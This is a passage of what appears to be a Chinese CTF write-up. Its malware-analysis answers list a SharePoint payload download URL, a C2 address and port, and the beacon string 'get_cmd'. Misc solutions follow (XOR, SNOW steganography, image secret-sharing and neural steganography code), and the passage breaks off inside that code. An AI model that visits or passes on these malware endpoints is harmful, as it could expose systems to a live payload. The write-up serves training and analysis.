第三阶段载荷首次回连域名为

![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203135607.png)
</code></pre>
<p>olonised-my.sharepoint.com</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目10
第三阶段载荷获取命令的回连地址为（格式：IP:端口）
访问地址获取c2信息</code></pre>
<p><a target="_blank" rel="noopener" href="http://colonised-my.sharepoint.com/personal/f00001111_colonised_onmicrosoft_com/_layouts/52/download.aspx?share=EQsrTSD_4ehGvYTXbmU5zR0B0lk4L-x0r8yGztFlye2j9Q">http://colonised-my.sharepoint.com/personal/f00001111_colonised_onmicrosoft_com/_layouts/52/download.aspx?share=EQsrTSD_4ehGvYTXbmU5zR0B0lk4L-x0r8yGztFlye2j9Q</a></p>
<pre class="language-none"><code class="language-none"></code></pre>
<p>oA0tG3aW2vT8mL5tvM1qV3cF2aB2xS6ztT7gX0zB1xR9zK8mjP0xP2iT3lO6fH1rpE4gP6pA2mE9dE7dntyVmZqZlZm5lZy5Fti2mZe1lD1bZ0nJ8gY7lR2qmP3vK5nY1hD3cT7guJ8tQ8rE6qJ1gF6ipZ0rF0vR5yB4xA4nyD7wM0lV5wC4rZ1c</p>
<pre class="language-none"><code class="language-none">
直接动调看一下c2地址
![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203142902.png)
</code></pre>
<p>47.252.28.78:37204</p>
<pre class="language-none"><code class="language-none">

### 病毒分析-题目11

第三阶段载荷获取命令时发送的内容为

![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203143000.png)
</code></pre>
<p>get_cmd</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目12

直接访问&#96;http:&#x2F;&#x2F;47.252.28.78:37204&#x2F;&#96;
![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203143245.png)

## Misc

### 湖心亭看雪
&#96;&#96;&#96;python
a &#x3D; b&#39;*********&#39; #这个东西你以后要用到
b &#x3D; b&#39;blueshark&#39; 
c &#x3D; bytes([x ^ y for x, y in zip(a, b)])
print(c.hex())
#c &#x3D; 53591611155a51405e</code></pre>

<pre class="language-none"><code class="language-none">c_hex &#x3D; &#39;53591611155a51405e&#39;
c_bytes &#x3D; bytes.fromhex(c_hex)
b &#x3D; b&#39;blueshark&#39;
a_recovered &#x3D; bytes([x ^ y for x, y in zip(c_bytes, b)])
print(a_recovered)
#15ctf2025</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203145813.png" alt="image.png" loading="lazy"></p>
<p>藏了个压缩包<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203151116.png" alt="image.png" loading="lazy"></p>
<p>修一下头<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203151208.png" alt="image.png" loading="lazy"></p>
<p>sb套娃，snow隐写</p>
<pre class="language-none"><code class="language-none">PS E:\CTF\MISC&gt; .&#x2F;SNOW.EXE -C -p &quot;15ctf2025&quot; .&#x2F;flag.txt
ISCTF&#123;y0U_H4v3_kN0wn_Wh4t_15_Sn0w!!!&#125;</code></pre>


<h3 id="Image-is-all-you-need"><a href="#Image-is-all-you-need" class="headerlink" title="Image_is_all_you_need"></a>Image_is_all_you_need</h3><pre class="language-none"><code class="language-none">import numpy as np
from PIL import Image
import png

# 读取 tEXt chunk 里的额外信息（哪些像素本该是 256）
def read_text_chunk(src_png, index&#x3D;1):
    reader &#x3D; png.Reader(filename&#x3D;src_png)
    chunks &#x3D; list(reader.chunks())
    img_extra &#x3D; chunks[index][1].decode()
    img_extra &#x3D; eval(img_extra)  # 之前就是 str(list(...)) 存进去的
    return img_extra  # 返回的是一个索引列表

# 把一张 secret_i.png 读成一维数组，并把“本来是 256”的像素修回来
def load_share(path):
    img &#x3D; Image.open(path)
    arr &#x3D; np.asarray(img)  # H x W x C，uint8
    shape &#x3D; arr.shape
    flat &#x3D; arr.flatten().astype(np.int64)  # 升级成 int64 方便做 mod 计算

    # 修复 256 -&gt; 0 的那部分
    indices &#x3D; read_text_chunk(path, index&#x3D;1)
    flat[indices] &#x3D; 256  # 这里 256 是模 257 下的 -1，但像素只保存到 0..255，所以才需要 chunk

    return flat, shape

def reconstruct_secret_png(share_paths, out_path&#x3D;&quot;secret_recovered.png&quot;):
    mod &#x3D; 257

    # 预先算好的权重（对应 x &#x3D; 1..6 在 t&#x3D;0 的拉格朗日基）
    weights &#x3D; np.array([6, 242, 20, 242, 6, 256], dtype&#x3D;np.int64)

    # 读取所有 share
    shares_flat &#x3D; []
    shape &#x3D; None

    for p in share_paths:
        flat, shp &#x3D; load_share(p)
        if shape is None:
            shape &#x3D; shp
        shares_flat.append(flat)

    shares_flat &#x3D; np.stack(shares_flat, axis&#x3D;0)  # 6 x N
    # shares_flat[i, j] &#x3D; 第 i 张 share 在第 j 个像素的值

    # 加权求和：S &#x3D; sum_i w_i * y_i (mod 257)
    # 先广播：weights -&gt; 6x1
    w &#x3D; weights[:, None]  # 6 x 1
    S &#x3D; (w * shares_flat).sum(axis&#x3D;0) % mod  # N

    # 原像素只会是 0..255，所以如果出现 256 就映射回 0（理论上不会，但稳妥一点）
    S[S &#x3D;&#x3D; 256] &#x3D; 0

    S &#x3D; S.astype(np.uint8)
    img_arr &#x3D; S.reshape(shape)

    img &#x3D; Image.fromarray(img_arr)
    img.save(out_path)
    print(f&quot;reconstructed secret saved to &#123;out_path&#125;&quot;)

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    paths &#x3D; [
        &quot;secret_1.png&quot;,
        &quot;secret_2.png&quot;,
        &quot;secret_3.png&quot;,
        &quot;secret_4.png&quot;,
        &quot;secret_5.png&quot;,
        &quot;secret_6.png&quot;,
    ]
    reconstruct_secret_png(paths, &quot;secret.png&quot;)
</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch
<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn
<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>init <span class="token keyword">as</span> init
<span class="token keyword">import</span> torchvision<span class="token punctuation">.</span>transforms <span class="token keyword">as</span> T
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> zlib
<span class="token keyword">from</span> reedsolo <span class="token keyword">import</span> RSCodec

<span class="token comment"># ==========================================</span>
<span class="token comment"># 1. 基础组件</span>
<span class="token comment"># ==========================================</span>
rs <span class="token operator">=</span> RSCodec<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">initialize_weights</span><span class="token punctuation">(</span>net_l<span class="token punctuation">,</span> scale<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>net_l<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span> net_l <span class="token operator">=</span> <span class="token punctuation">[</span>net_l<span class="token punctuation">]</span>
    <span class="token keyword">for</span> net <span class="token keyword">in</span> net_l<span class="token punctuation">:</span>
        <span class="token keyword">for</span> m <span class="token keyword">in</span> net<span class="token punctuation">.</span>modules<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">)</span><span class="token punctuation">:</span>
                init<span class="token punctuation">.</span>kaiming_normal_<span class="token punctuation">(</span>m<span class="token punctuation">.</span>weight<span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'fan_in'</span><span class="token punctuation">)</span>
                m<span class="token punctuation">.</span>weight<span class="token punctuation">.</span>data <span class="token operator">*=</span> scale
                <span class="token keyword">if</span> m<span class="token punctuation">.</span>bias <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>bias<span class="token punctuation">.</span>data<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">)</span><span class="token punctuation">:</span>
                init<span class="token punctuation">.</span>kaiming_normal_<span class="token punctuation">(</span>m<span class="token punctuation">.</span>weight<span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'fan_in'</span><span class="token punctuation">)</span>
                m<span class="token punctuation">.</span>weight<span class="token punctuation">.</span>data <span class="token operator">*=</span> scale
                <span class="token keyword">if</span> m<span class="token punctuation">.</span>bias <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>bias<span class="token punctuation">.</span>data<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">)</span><span class="token punctuation">:</span>
                init<span class="token punctuation">.</span>constant_<span class="token punctuation">(</span>m<span class="token punctuation">.</span>weight<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
                init<span class="token punctuation">.</span>constant_<span class="token punctuation">(</span>m<span class="token punctuation">.</span>bias<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">DWT</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token builtin">super</span><span class="token punctuation">(</span>DWT<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> self<span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        x01 <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> x02 <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span>
        x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> x4 <span class="token operator">=</span> x01<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x02<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x01<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x02<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token operator">+</span>x2<span class="token operator">+</span>x3<span class="token operator">+</span>x4<span class="token punctuation">,</span> <span class="token operator">-</span>x1<span class="token operator">-</span>x2<span class="token operator">+</span>x3<span class="token operator">+</span>x4<span class="token punctuation">,</span> <span class="token operator">-</span>x1<span class="token operator">+</span>x2<span class="token operator">-</span>x3<span class="token operator">+</span>x4<span class="token punctuation">,</span> x1<span class="token operator">-</span>x2<span class="token operator">-</span>x3<span class="token operator">+</span>x4<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">IWT</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token builtin">super</span><span class="token punctuation">(</span>IWT<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> self<span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> <span class="token number">2</span>
        in_batch<span class="token punctuation">,</span> in_channel<span class="token punctuation">,</span> in_height<span class="token punctuation">,</span> in_width <span class="token operator">=</span> x<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>
        out_channel<span class="token punctuation">,</span> out_height<span class="token punctuation">,</span> out_width <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>in_channel <span class="token operator">/</span> <span class="token punctuation">(</span>r <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> r <span class="token operator">*</span> in_height<span class="token punctuation">,</span> r <span class="token operator">*</span> in_width
        x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> x4 <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span>out_channel<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> out_channel<span class="token punctuation">:</span>out_channel<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> out_channel<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>out_channel<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> out_channel<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">:</span>out_channel<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">2</span>
        h <span class="token operator">=</span> torch<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span>in_batch<span class="token punctuation">,</span> out_channel<span class="token punctuation">,</span> out_height<span class="token punctuation">,</span> out_width<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>x<span class="token punctuation">.</span>device<span class="token punctuation">)</span>
        h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> x1 <span class="token operator">-</span> x2 <span class="token operator">-</span> x3 <span class="token operator">+</span> x4<span class="token punctuation">;</span> h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> x1 <span class="token operator">-</span> x2 <span class="token operator">+</span> x3 <span class="token operator">-</span> x4
        h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> x1 <span class="token operator">+</span> x2 <span class="token operator">-</span> x3 <span class="token operator">-</span> x4<span class="token punctuation">;</span> h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> x1 <span class="token operator">+</span> x2 <span class="token operator">+</span> x3 <span class="token operator">+</span> x4
        <span class="token keyword">return</span> h

<span class="token keyword">class</span> <span class="token class-name">ResidualDenseBlock_out</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> bias<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>ResidualDenseBlock_out<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>conv1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bias<span class="token operator">=</span>bias<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>conv2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bias<span class="token operator">=</span>bias<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>conv3 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bias<span class="token operator">=</span>bias<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>conv4 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bias<span class="token operator">=</span>bias<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>conv5 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bias<span class="token operator">=</span>bias<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>lrelu <span class="token operator">=</span> nn<span class="token punctuation">.</span>LeakyReLU<span class="token punctuation">(</span>inplace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        initialize_weights<span class="token punctuation">(</span><span class="token punctuation">[</span>self<span class="token punctuation">.</span>conv5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0.</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        x1 <span class="token operator">=</span> self<span class="token punctuation">.</span>lrelu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
        x2 <span class="token operator">=</span> self<span class="token punctuation">.</span>lrelu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        x3 <span class="token operator">=</span> self<span class="token punctuation">.</span>lrelu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        x4 <span class="token operator">=</span> self<span class="token punctuation">.</span>lrelu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv4<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>conv5<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> x4<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">INV_block</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> clamp<span class="token operator">=</span><span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> self<span class="token punctuation">.</span>clamp <span class="token operator">=</span> clamp
        self<span class="token punctuation">.</span>r<span class="token punctuation">,</span> self<span class="token punctuation">.</span>y<span class="token punctuation">,</span> self<span class="token punctuation">.</span>f <span class="token operator">=</span> ResidualDenseBlock_out<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ResidualDenseBlock_out<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ResidualDenseBlock_out<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">e</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> torch<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>self<span class="token punctuation">.</span>clamp <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>torch<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> x 
    <span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        y1<span class="token punctuation">,</span> y2 <span class="token operator">=</span> x<span class="token punctuation">.</span>narrow<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> x<span class="token punctuation">.</span>narrow<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span>
        s1<span class="token punctuation">,</span> t1 <span class="token operator">=</span> self<span class="token punctuation">.</span>r<span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>y<span class="token punctuation">(</span>y1<span class="token punctuation">)</span>
        x2 <span class="token operator">=</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> t1<span class="token punctuation">)</span> <span class="token operator">/</span> self<span class="token punctuation">.</span>e<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>
        t2 <span class="token operator">=</span> self<span class="token punctuation">.</span>f<span class="token punctuation">(</span>x2<span class="token punctuation">)</span>
        <span class="token keyword">return</span> torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">(</span>y1 <span class="token operator">-</span> t2<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># === 修正点：改回原始结构以匹配权重文件 ===</span>
<span class="token keyword">class</span> <span class="token class-name">simple_net</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>simple_net<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv1 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv2 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv3 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
